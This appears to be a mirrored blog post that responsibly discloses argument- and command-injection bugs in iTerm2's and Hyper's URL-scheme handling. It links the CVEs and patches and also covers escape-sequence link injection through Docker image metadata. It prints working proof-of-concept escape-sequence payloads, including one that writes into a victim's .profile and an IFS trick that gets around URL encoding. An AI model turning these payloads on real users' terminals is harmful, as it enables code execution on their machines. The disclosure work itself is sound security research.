<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://vin01.github.io/piptagole/escape-sequences/iterm2/hyper/url-handlers/code-execution/2024/05/21/arbitrary-url-schemes-terminal-emulators.html">Original</a>
    <h1>Abusing url handling in iTerm2 and Hyper for code execution</h1>
    
    <div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <h2 id="what-are-escape-sequences">What are escape sequences</h2>

<p>Modern terminals are very capable tools with quite extended support for various <a href="https://en.wikipedia.org/wiki/ANSI_escape_code">escape sequences</a>. These escape sequences are specially treated by terminal emulators to generate colors, cursor styles, cliboard access and even <em>*wink*</em> hyperlinks!</p>

<p>A few examples of commonly used escape sequences:</p>

<p>Change title of the terminal window to <code>new-title</code>:</p>

<div><div><pre><code>$ echo -e &#34;\e]2;new-title\a&#34;
</code></pre></div></div>

<p>Ring a bell:</p>



<h2 id="hyperlinks-in-terminals">Hyperlinks in terminals</h2>

<p><a href="https://github.com/Alhadis/OSC8-Adoption">Most terminal emulators</a> these days allow using <code>Osc 8</code> to directly generate hyperlinks from arbitrary text.</p>

<p>Typically it looks something like following:</p>

<div><div><pre><code>echo -e &#39;\033]8;;http://example.com\033\\This is a link\033]8;;\033\\\n&#39;
</code></pre></div></div>

<p>It is just like HTMl <code>&lt;a&gt;</code> element, right in our terminals.</p>

<h2 id="arbitrary-url-schemes">Arbitrary url schemes</h2>

<p>Browsers have been improving(?) over time and now mostly show a pop up to open external programs if a link uses non-standard url schemes like <code>ssh://</code>, <code>ftp://</code>, <code>x-man-page://</code> etc.</p>

<p>A pop-up after clicking a <code>ssh://</code> link in a rendered HTML page looks something like this:</p>

<p><img src="https://vin01.github.io/piptagole/assets/browser_warn.png" alt="Dialog box"/></p>

<p>However, in most terminal emulators, the links are opened directly in whichever program registered to handle that url scheme i.e. an SSH client for <code>ssh://</code> urls.</p>

<h2 id="terminal-emulators-as-url-scheme-handlers">Terminal emulators as url scheme handlers</h2>

<p>The default MacOS terminal registers various url scheme handlers on OS X. Any links using those schemes when clicked, would open the MacOS terminal to perform the corresponding action.</p>

<p>e.g. <code>telnet</code>, <code>x-man-page</code>, <code>ssh</code>, <code>whois</code></p>

<p>You can view the information about url schemes registered on your OS X system using:</p>

<div><div><pre><code>/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -dump | grep -B3 bindings:.*:
</code></pre></div></div>

<p><a href="https://iterm2.com/news.html">iTerm2</a> similarly allows selecting various url schemes to be handled by itself. The vulnerabilities I am going to share affected the handling of two such url schemes by iTerm2 and one by Vercel’s Hyper.</p>

<h2 id="vulnerability-1">Vulnerability #1</h2>

<p>Handling of <code>x-man-page://</code> url scheme by iTerm2 was vulnerable to code execution through argument injection.</p>

<p>PoC:</p>

<div><div><pre><code>&#39;x-man-page://foo -P&#34;open -aCalculator&#34;&#39;
</code></pre></div></div>

<p>OSC 8 version to generate the exploit link from terminal itself which when clicked would pop a calculator:</p>

<div><div><pre><code>echo -e &#39;\e]8;;x-man-page://foo%00-P%22open%20-aCalculator%22\e\\This is a link\e]8;;\e\\&#39;
</code></pre></div></div>

<p><img src="https://vin01.github.io/piptagole/assets/iterm21.png" alt="iterm2 vuln1"/></p>

<p>Patch: <a href="https://gitlab.com/gnachman/iterm2/-/commit/de3d351e1bd3bc1c1a4f85fe976c592e497dd071">https://gitlab.com/gnachman/iterm2/-/commit/de3d351</a></p>

<p><a href="https://www.cvedetails.com/cve/CVE-2023-46321/">CVE-2023-46321</a></p>

<h2 id="vulnerability-2">Vulnerability #2</h2>

<p>Handling of <code>ssh://</code> url scheme by iTerm2 was vulnerable to argument injection allowing arbitrary file write.</p>

<p>PoC:</p>

<div><div><pre><code>echo -e &#39;\e]8;;ssh://-E.profile/`launch-calc`\e\This is a link\e]8;;\e\&#39;
</code></pre></div></div>

<p>This would append following content to the victim’s <code>.profile</code>:</p>

<div><div><pre><code>ssh: Could not resolve hostname cd /`launch-calc`; exec $shell -l: nodename nor servname provided, or not known^M
</code></pre></div></div>

<p>And once sourced, it would execute the <code>lunch-calc</code> command allowing a somewhat delayed limited code execution. Injecting a more elaborate payload might also be possible, not just a single command. Also abusing SSH flags like <code>-F</code> to provide a config file, an attacker could also abuse an already existing local file on the target’s device to achieve the same.</p>

<p>Patch: <a href="https://gitlab.com/gnachman/iterm2/-/commit/ef7bb84520013b2524df9787d4aa9f2c96746c01">https://gitlab.com/gnachman/iterm2/-/commit/ef7bb84</a></p>

<p><a href="https://www.cvedetails.com/cve/CVE-2023-46322/">CVE-2023-46322</a>, the patch has been released in version <a href="https://iterm2.com/downloads.html">3.5.0</a></p>

<h2 id="vulnerability-3">Vulnerability #3</h2>

<p><a href="https://hyper.is/">Hyper</a> when installed, registers itself as the handler of <code>ssh://</code> url schemes. Luckily this feature is <a href="https://github.com/vercel/hyper/pull/7170">broken</a> in <code>3.4.1</code> but works in canary versions since <code>4.0.0-canary4</code>.</p>

<p>Failed PoC for lulz:</p>

<div><div><pre><code>echo -e &#39;\e]8;;ssh://example.com&amp;open%20-aCalculator/\e\This is a link\e]8;;\e\&#39;
</code></pre></div></div>

<p>But of course, thanks to url encoding this does not work and we encounter:</p>

<div><div><pre><code>bash: open%20-aCalculator: command not found
</code></pre></div></div>

<p>(same for <code>ssh://example.com&amp;open -aCalculator/</code> of course because the space automatically gets converted to url encoded version)</p>

<p><code>IFS</code> for the rescue!</p>

<p>Successful PoC:</p>

<div><div><pre><code>echo -e &#39;\e]8;;ssh://example.com&amp;open$IFS-aCalculator/\e\This is a link\e]8;;\e\&#39;
</code></pre></div></div>

<p><img src="https://vin01.github.io/piptagole/assets/hyper.png" alt="Hyper code execution"/></p>

<p>Patch: <a href="https://github.com/vercel/hyper/pull/7615">https://github.com/vercel/hyper/pull/7615</a></p>



<p>What better tool to inject arbitrary text containing escape sequences (and hence hyperlinks) into our terminal emulators than Docker?</p>

<p>I created a simple docker image using only one instruction in the Dockerfile i.e. <code>FROM alpine:laest</code>, exported it to tar, modified the json metadata to contain following <code>architecture</code> value to create a new image:</p>

<div><div><pre><code>{&#34;architecture&#34;:&#34;) not found ..\n\n\u001B]8;;https://example.com\u0007Please click this link to install latest docker client.\u001B]8;;\u0007\n\n&#34;, ...
</code></pre></div></div>

<p>This is of course a harmless PoC and you can try it out using <code>docker pull vin01/escape-seq-test:latest --platform darwin/arm64</code> or <code>docker run --rm vin01/escape-seq-test</code> and you should see the injected link as shown below.</p>

<p><img src="https://vin01.github.io/piptagole/assets/bad-moby.png" alt="bad mody 1"/></p>

<p><img src="https://vin01.github.io/piptagole/assets/bad-moby-2.png" alt="bad mody 2"/></p>

<p>This was disclosed to Docker in August last year but is still unpatched and in combination with <a href="https://blog.solidsnail.com/posts/2023-08-28-iterm2-rce">other vulnerabilities</a> in terminal emulators may be leveraged as an easy attach vector to abuse.</p>



<p>I also came across a couple more issues in iTerm2 which were handled in a timely manner and fixed very quickly.</p>

<ul>
  <li><a href="https://gitlab.com/gnachman/iterm2/-/commit/d1ca91e0e795479da889ff4318921b517997de6a">RemoteHost escape sequence</a></li>
  <li><a href="https://gitlab.com/gnachman/iterm2/-/commit/baa60a93309e71befbe378f116f6b03a90bf75dd">Window title buffer overflow</a></li>
</ul>



<p>Shoutout to <a href="https://github.com/solid-snail">solid-snail</a> for uncovering another flaw in iTerm2: <a href="https://blog.solidsnail.com/posts/2023-08-28-iterm2-rce">From Terminal Output to Arbitrary Remote Code Execution</a></p>

<p>And to <a href="https://x.com/stokfredrik">STÖK</a> for <a href="https://www.youtube.com/watch?v=3T2Al3jdY38">Weaponizing Plain Text ANSI Escape Sequences as a Forensic Nightmare</a></p>



<ul>
  <li>Thanks to Vercel team for handling it under their responsible disclosure program and the swag.</li>
  <li>Thanks to  George Nachman for maintaining iTerm2 and handling vulnerability reports.</li>
</ul>

<p>Exploring a similar attack vector on Linux and WIndows terminals might also be worthwhile.</p>

<p><strong>Upgrade to iTerm2 3.5.0</strong>: <a href="https://iterm2.com/downloads.html">https://iterm2.com/downloads.html</a></p>

<p><a href="https://iterm2.com/donate.html">How to donate to iTerm2</a></p>

  </div>
</article>

      </div>
    </div></div>
  </body>
</html>
